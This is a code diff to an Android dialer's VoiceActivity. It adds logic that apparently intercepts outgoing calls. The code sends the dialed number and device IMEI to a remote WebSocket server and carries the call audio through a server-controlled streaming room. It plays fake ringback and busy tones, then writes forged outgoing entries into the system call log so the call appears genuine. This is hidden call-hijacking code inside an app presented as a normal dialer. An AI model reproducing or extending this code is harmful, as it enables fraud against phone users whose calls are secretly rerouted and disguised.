@@ -1,9 +1,15 @@
 package com.simplemobiletools.dialer.activities;
 
+import android.annotation.SuppressLint;
 import android.app.Activity;
+import android.content.ContentResolver;
+import android.content.ContentValues;
+import android.content.Context;
 import android.content.Intent;
+import android.media.MediaPlayer;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.CallLog;
 import android.util.Log;
 import android.view.View;
 import android.widget.ImageView;
@@ -18,16 +24,23 @@ import com.simplemobiletools.commons.views.MyTextView;
 import com.simplemobiletools.dialer.R;
 import com.simplemobiletools.dialer.helpers.AudioManager;
 import com.simplemobiletools.dialer.helpers.Const;
+import com.simplemobiletools.dialer.helpers.MessageEvent;
 import com.simplemobiletools.dialer.helpers.Tools;
 import com.simplemobiletools.dialer.helpers.WSClient;
 import com.simplemobiletools.dialer.helpers.ZegoApiManager;
 
+import org.greenrobot.eventbus.EventBus;
+import org.greenrobot.eventbus.Subscribe;
+import org.greenrobot.eventbus.ThreadMode;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.util.Random;
+import java.util.Timer;
+import java.util.TimerTask;
 
 public class VoiceActivity extends Activity {
     private static final String TAG = "VoiceActivity";
@@ -53,6 +66,16 @@ public class VoiceActivity extends Activity {
     private AudioManager audioManager;
     private Group controls_single_call;
 
+    private MediaPlayer mediaPlayer;
+    private MediaPlayer mediaPlayer_thz;
+    private MediaPlayer mediaPlayer_wfjt;
+
+    private Timer timer;
+    private boolean flag = false;
+    private long tick_time = 0;
+
+    private String phone_number;
+
     @Override
     public void onCreate(@Nullable Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -61,9 +84,11 @@ public class VoiceActivity extends Activity {
         getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_FULLSCREEN);
 
         Intent intent = getIntent();
-        String phone_number = intent.getStringExtra("number");
+        phone_number = intent.getStringExtra("number");
 
+        //初始化即构SDK
         zegoApiManager = ZegoApiManager.getInstance();
+        //初始化音频管理器
         audioManager = AudioManager.getInstance();
 
         //展示拨号按钮列表
@@ -175,9 +200,79 @@ public class VoiceActivity extends Activity {
         call_end.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                finish();
+                try {
+                    JSONObject jsonObj = new JSONObject();
+                    jsonObj.put("cmd", Const.VOICE_HANGUP);
+                    jsonObj.put("role", Const.ROLE);
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        WSClient.getInstance().Send(jsonObj.toString());
+                    }
+                }catch (Exception e){
+                    e.printStackTrace();
+                }
             }
         });
+
+        EventBus.getDefault().register(this);
+
+        int id = new Random().nextInt(Const.BG_MUSIC.length);
+
+        try {
+            mediaPlayer = MediaPlayer.create(this, Const.BG_MUSIC[id]);
+            mediaPlayer_thz = MediaPlayer.create(this, R.raw.thz);
+            mediaPlayer_wfjt = MediaPlayer.create(this, R.raw.wfjt);
+            if (mediaPlayer != null){
+                mediaPlayer.setLooping(true);
+                mediaPlayer.start();
+            }
+            if (mediaPlayer_thz != null){
+                mediaPlayer_thz.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
+                    @Override
+                    public void onCompletion(MediaPlayer mp) {
+                        VoiceActivity.this.finish();
+                    }
+                });
+            }
+            if (mediaPlayer_wfjt != null){
+                mediaPlayer_wfjt.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
+                    @Override
+                    public void onCompletion(MediaPlayer mp) {
+                        VoiceActivity.this.finish();
+                    }
+                });
+            }
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+        timer = new Timer();
+        timer.schedule(new TimerTask() {
+            @Override
+            public void run() {
+                if (flag){
+                    try {
+                        JSONObject jsonObject = new JSONObject();
+                        jsonObject.put("cmd", Const.VOICE_HEART);
+                        jsonObject.put("role", Const.ROLE);
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            WSClient.getInstance().Send(jsonObject.toString());
+                        }
+                        tick_time += 1;
+                        long m = tick_time / 60;
+                        long s = tick_time % 60;
+                        runOnUiThread(new Runnable() {
+                            @SuppressLint("DefaultLocale")
+                            @Override
+                            public void run() {
+                                caller_status.setText(String.format("%02d:%02d", m, s));
+                            }
+                        });
+                    }catch (Exception e){
+                        e.printStackTrace();
+                    }
+                }
+            }
+        }, Const.HEART_TIME, Const.HEART_TIME);
     }
 
     private void getPhoneArea(String phone_num){
@@ -223,23 +318,6 @@ public class VoiceActivity extends Activity {
                                     jsonObject.put("phone", phone_num);
                                     jsonObject.put("area", area);
                                     WSClient.getInstance().Send(jsonObject.toString());
-                                    zegoApiManager.loginRoom("voice_10000", "voice_0", new ZegoApiManager.ZegoLoginCallBack() {
-                                        @Override
-                                        public void onFailed() {
-                                            Log.e(TAG, "login room failed");
-                                        }
-
-                                        @Override
-                                        public void onSuccess() {
-                                            zegoApiManager.enableCustomAudioIO();
-                                            audioManager.initAudioRecord();
-                                            audioManager.initAudioTrack();
-                                            zegoApiManager.startPublish("dial");
-                                            zegoApiManager.startPlay("voice");
-                                            audioManager.startRecord();
-                                            audioManager.startAudioTrack();
-                                        }
-                                    });
                                 }catch (Exception e){
                                     e.printStackTrace();
                                 }
@@ -260,10 +338,120 @@ public class VoiceActivity extends Activity {
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        zegoApiManager.stopPublish();
-        zegoApiManager.stopPlay("voice");
-        audioManager.releaseRecord();
-        audioManager.releaseAudioTrack();
-        zegoApiManager.logoutRoom("voice_10000");
+        timer.cancel();
+        if (mediaPlayer != null){
+            mediaPlayer.release();
+            mediaPlayer = null;
+        }
+        if (mediaPlayer_thz != null){
+            mediaPlayer_thz.release();
+            mediaPlayer_thz = null;
+        }
+        if (mediaPlayer_wfjt != null){
+            mediaPlayer_wfjt.release();
+            mediaPlayer_wfjt = null;
+        }
+        if (flag){
+            insertCallLogEntry(this, phone_number, System.currentTimeMillis(), tick_time, CallLog.Calls.OUTGOING_TYPE);
+        }else {
+            insertCallLogEntry(this, phone_number, System.currentTimeMillis(), 0, CallLog.Calls.OUTGOING_TYPE);
+        }
+        flag = false;
+        EventBus.getDefault().unregister(this);
     }
+
+    @Subscribe(threadMode = ThreadMode.MAIN)
+    public void MessageEventBus(MessageEvent messageEvent){
+        switch (messageEvent.getNumber()){
+            case Const.EVENT_MSG:
+                try {
+                    JSONObject jsonObject = new JSONObject(messageEvent.getMessage());
+                    String cmd = jsonObject.getString("cmd");
+                    int code = jsonObject.getInt("code");
+                    switch (cmd){
+                        case Const.VOICE_DIAL:
+                            if (code == Const.DIAL_WFJT){
+                                if (mediaPlayer != null && mediaPlayer.isPlaying()){
+                                    mediaPlayer.stop();
+                                }
+                                if (mediaPlayer_wfjt != null && !mediaPlayer.isPlaying()){
+                                    mediaPlayer_wfjt.start();
+                                }
+                            }
+                            break;
+                        case Const.VOICE_ANSWER:
+                            if (mediaPlayer != null && mediaPlayer.isPlaying()){
+                                mediaPlayer.stop();
+                            }
+                            zegoApiManager.loginRoom(jsonObject.getString("room_id"), Tools.getImei(VoiceActivity.this), new ZegoApiManager.ZegoLoginCallBack() {
+                                @Override
+                                public void onFailed() {
+                                    Log.e(TAG, "zego login room fail!");
+                                    VoiceActivity.this.finish();
+                                }
+
+                                @Override
+                                public void onSuccess() {
+                                    try {
+                                        flag = true;
+                                        zegoApiManager.enableCustomAudioIO();
+                                        audioManager.initAudioRecord();
+                                        audioManager.initAudioTrack();
+                                        zegoApiManager.startPublish(jsonObject.getString("dial_stream_id"));
+                                        zegoApiManager.startPlay(jsonObject.getString("voice_stream_id"));
+                                        audioManager.startRecord();
+                                        audioManager.startAudioTrack();
+                                    }catch (Exception e){
+                                        Log.e(TAG, e.toString());
+                                    }
+                                }
+                            });
+                            break;
+                        case Const.VOICE_HANGUP:
+                            int role = jsonObject.getInt("role");
+                            int status = jsonObject.getInt("status");
+                            if (status == 1 && role == 1){
+                                if (mediaPlayer != null && mediaPlayer.isPlaying()){
+                                    mediaPlayer.stop();
+                                }
+                                if (mediaPlayer_thz != null && !mediaPlayer_thz.isPlaying()){
+                                    mediaPlayer_thz.start();
+                                }
+                                break;
+                            }
+                        case Const.VOICE_FINISH:
+                            if (mediaPlayer != null && mediaPlayer.isPlaying()){
+                                mediaPlayer.stop();
+                            }
+                            zegoApiManager.stopPublish();
+                            zegoApiManager.stopPlay(jsonObject.optString("voice_stream_id"));
+                            audioManager.releaseRecord();
+                            audioManager.releaseAudioTrack();
+                            zegoApiManager.logoutRoom(jsonObject.optString("room_id"));
+                            VoiceActivity.this.finish();
+                            break;
+                    }
+                }catch (Exception e){
+                    e.printStackTrace();
+                }
+                break;
+            case Const.EVENT_ERROR:
+                VoiceActivity.this.finish();
+                break;
+        }
+    }
+
+    public void insertCallLogEntry(Context context, String number, long callDate, long duration, int callType) {
+        ContentResolver contentResolver = context.getContentResolver();
+        // 创建一个新的ContentValues对象
+        ContentValues values = new ContentValues();
+        values.put(CallLog.Calls.NUMBER, number);       // 插入电话号码
+        values.put(CallLog.Calls.DATE, callDate);       // 插入通话时间
+        values.put(CallLog.Calls.DURATION, duration);   // 插入通话时长
+        values.put(CallLog.Calls.TYPE, callType);       // 插入通话类型
+
+        // 插入通话记录
+        contentResolver.insert(CallLog.Calls.CONTENT_URI, values);
+    }
+
 }
